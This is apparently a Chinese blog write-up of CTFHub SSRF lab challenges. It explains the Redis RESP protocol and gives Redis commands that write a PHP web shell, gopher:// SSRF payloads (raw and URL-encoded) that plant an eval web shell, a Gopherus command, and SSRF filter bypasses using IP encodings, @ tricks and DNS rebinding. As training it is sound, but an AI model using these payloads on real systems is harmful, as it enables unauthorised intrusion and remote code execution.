<img src="https://i-blog.csdnimg.cn/blog_migrate/dbe7e8b60e6e5c290185c9d7144cd5a8.png" alt="" style="max-height:323px; box-sizing:content-box;" />


我们能发现刚刚执行的命令出现在了这里

### RESP协议

```undefined
Redis服务器和客户端 通过 RESP协议通信
 
是支持下面这些数据类型的 序列化协议
 
 
简单字符串
 
错误
 
整数
 
批量字符串
 
数组
```

下面是 响应协议的方式

```cobol
1 客户端 将命令 通过 bulk string的 RESP数组 发送到Redis服务器
 
2.服务器根据命令回复一种类型
 
 
 
Simple String （简单字符串）  回复第一个字节 +
 
error （错误）                回复第一个字节 -
 
Integer  （整数）             回复第一个字节 ：
 
Bulk String   （复杂字符串）  回复第一个字节 $
 
array  （数组）               回复第一个字节 *
 
在协议中 不同部分的 终止 使用 CRLF (\r\n) 结束
```

我们可以通过上面这个知识点来解读一下数据包



<img src="https://i-blog.csdnimg.cn/blog_migrate/6f485117d6cb88dffefd38e6b67f5bb6.png" alt="" style="max-height:77px; box-sizing:content-box;" />


```cobol
*1
 
代表这个命令行只存在一个元素 就是 ping
 
$4 
 
代表字符数为 4   ping
 
```

说了这么多 我们要如何实现攻击呢

### 攻击

#### 无密码未授权的攻击

```cobol
ip:6788> flushall
OK
ip:6788> config set dir /tmp
OK
ip:6788> config set dbfilename shell.php
OK
ip:6788> set x "<?php phpinfo();?>"
OK
ip:6788> save
OK
 
```

然后我们去看看 是否写入了



<img src="https://i-blog.csdnimg.cn/blog_migrate/f51d58b0fb76bc4bb0dfb65a41cd94a7.png" alt="" style="max-height:171px; box-sizing:content-box;" />


我们发现写入成功 因为这是无密码 在做题或实际中很少存在

#### 认证访问

我们可以重新拉取一个镜像

```cobol
# 进入容器中修改配置文件
sed -i 's/#requirepass 123123/requirepass 123123/g' /etc/redis.conf
 
exit
 
docker restart redis_test
 
tcpdump -i eth0 port 6379 -w pass.pcap
 
```

然后我们一样通过 redis_cli访问

```cobol
ip:6788> ping
(error) NOAUTH Authentication required.
 
发现需要密码了
 
然后我们需要指定密码
 
 .\redis-cli.exe -h ip -p 6788 -a 123123
```

就可以发现执行成功

然后我们只需要和上面一样写入shell 即可

```bash
flushall
 
config set dir /tmp
 
config set dbfilename shell.php
 
set x "<?php phpinfo();?>"
 
save
```

我们去看看是否写入



<img src="https://i-blog.csdnimg.cn/blog_migrate/126e5c1b5b2c1ff18c13adde0aaf3ae9.png" alt="" style="max-height:140px; box-sizing:content-box;" />


然后我们再看看流量包

```cobol
docker cp redis_test:/pass.pcap /mnt/c/Users/Administrator/Desktop
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/76daa139930d3e2f40f05e65587e78d1.png" alt="" style="max-height:181px; box-sizing:content-box;" />
我们能发现 在流量包上 已经通过了 认证 然后下面就是命令

### 做题

这里我们首先通过 dict 协议 加上bp去探测开放端口

```cobol
dict://127.0.0.1:8000
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/765d69dbab91b3c12f509efb2e27cff9.png" alt="" style="max-height:482px; box-sizing:content-box;" />
发现 6379端口存在 redis

其实payload的原版是

```cobol
/?url=gopher://127.0.0.1:6379/_*1
$8
flushall
*3
$3
set
$1
1
$32
 
 
<?php eval($_GET["feng"]);?>
 
 
*4
$6
config
$3
set
$3
dir
$13
/var/www/html
*4
$6
config
$3
set
$10
dbfilename
$8
feng.php
*1
$4
save
```

这样的 和之前差不多 就是直接通过 流量包复制出来 然后命令执行

我们继续通过  gopherus 来实现

```sql
python2 gopherus.py --exploit redis
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b2d75d3f4ecc149dedf40672b6c2a736.png" alt="" style="max-height:212px; box-sizing:content-box;" />


然后再进行一次 url编码

```cobol
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522cmd%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```

然后直接 上传递 然后直接通过蚁剑链接即可 不需要 有回显 一般都是 time out



<img src="https://i-blog.csdnimg.cn/blog_migrate/b0700336328a483351eecb8811c5c113.png" alt="" style="max-height:174px; box-sizing:content-box;" />




## URL Bypass

开始学习bypass内容

这里的知识点好像没有特别多 主要是学习如何绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/c2deab634f5eef6561d3fc797d3bd577.png" alt="" style="max-height:220px; box-sizing:content-box;" />


这里提示 必须要包含这个地址

这里的绕过内容为@

```typescript
意思就是 
 
127.0.0.1@www.baidu.com
 
和
 
www.baidu.com 
 
两个访问的内容是一样的
 
```

所以这道题 需要包含 那么我们直接构造即可

```cobol
?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
```

## 数字IP Bypass



<img src="https://i-blog.csdnimg.cn/blog_migrate/e52ccc61e1bdad90dd8b1fa78d41da8f.png" alt="" style="max-height:147px; box-sizing:content-box;" />


这里提示不能用点分十进制

那我们可不可以使用其他进制

```cobol
127.0.0.1:
 
 
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433
 
或者利用其他为 127.0.0.1的内容
 
http://localhost/
http://0/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://①②⑦.⓪.⓪.①
```

直接替换得到flag

## 302跳转 Bypass

这道题貌似有很多解法

首先我们可以通过上面的 方式访问 flag

```cobol
/?url=2130706433/flag.php
```

这里很显然没有什么302跳转的东西

这里记录一下

其他短链接 和 xip.io没有实现

 [短网址-短链接生成](https://www.985.so/)   
  




## DNS重绑定 Bypass

给大家画个图

DNS其实就是类似于

手机中的电话簿

```cobol
名字            电话
 
 
lll            188888888
 
 
域名                ip
 
 
baidu.com        xxx.xxx.xxx.xxx
```

都是一一映射

```undefined
电脑访问页面的时候 会先去 HOST 文件中 查看 是否存储了 ip地址
 
如果host文件中没有存储
 
就会发送请求给DNS服务器
 
然后通过DNS服务器来返回真正的ip地址 即（电话）
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/abbef8621b843c3c73c5969785cd2af5.png" alt="" style="max-height:727px; box-sizing:content-box;" />


流程大致如下

### bypass原理

```cobol
首先我们知道正常访问的流程
 
 
1.获取输入的url 并且从url中解析 host
 
2.对该host进行解析 获取到ip地址
 
3.检查ip地址是否合法 是否是私有ip等
 
4.进入 curl 发包阶段
 
```

这里注意 DNS对 url进行了 两次解析

1. url中解析 host

2.curl中的解析

```undefined
这两个解析存在着时间差
 
对应的事件是 TTL
 
TTL 其实就是 DNS里面的域名和ip绑定关系的 Cache
 
在服务器上存活的时间 
 
如果超过存活时间 就需要重新绑定
```

下面是绕过的思路

```undefined
我们在一次 url请求的时候 
 
首先通过 合法域名ip 绕过第一次的合法验证
 
当 TTL 超过时间后 我们修改url的ip 
 
这个时候就会重新绑定 但是第一次验证已经实现
 
所以我们如果修改为 内网 就会访问到内网去了
```

总结一下

DNS解析存在时间差 我们在第一次访问后 修改 url背后的ip 这样DNS全程都是访问一个域名 所以不会处于非法 但是修改完后 是内网地址 我们就可以访问内网的服务 实现SSRF操作了

### 做题

 [rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html) 

这个网站可以实现上面的操作



<img src="https://i-blog.csdnimg.cn/blog_migrate/fc6c7ea28462593afa8ee481b1e3b07e.png" alt="" style="max-height:218px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/d672e7bdbe9786c41bcf11b3e28e739e.png" alt="" style="max-height:184px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/9a06afbdde68f25f335e2c1aad187a66.png" alt="" style="max-height:163px; box-sizing:content-box;" />


实现了 DNS 重定向 bypass